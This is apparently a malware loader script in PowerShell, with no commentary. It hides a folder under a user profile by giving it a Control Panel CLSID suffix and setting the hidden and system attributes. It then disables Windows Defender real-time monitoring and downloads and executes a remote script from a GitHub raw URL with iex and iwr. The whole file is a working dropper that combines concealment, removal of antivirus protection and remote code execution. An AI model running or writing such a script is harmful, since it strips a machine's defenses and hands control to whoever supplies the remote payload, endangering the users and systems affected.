$rdir = "C:\Users\hai1723"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
attrib +h +s $dir

$temp = "$dir\temp"

Set-MpPreference -DisableRealtimeMonitoring $true

iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/vm.ps1" -useb)
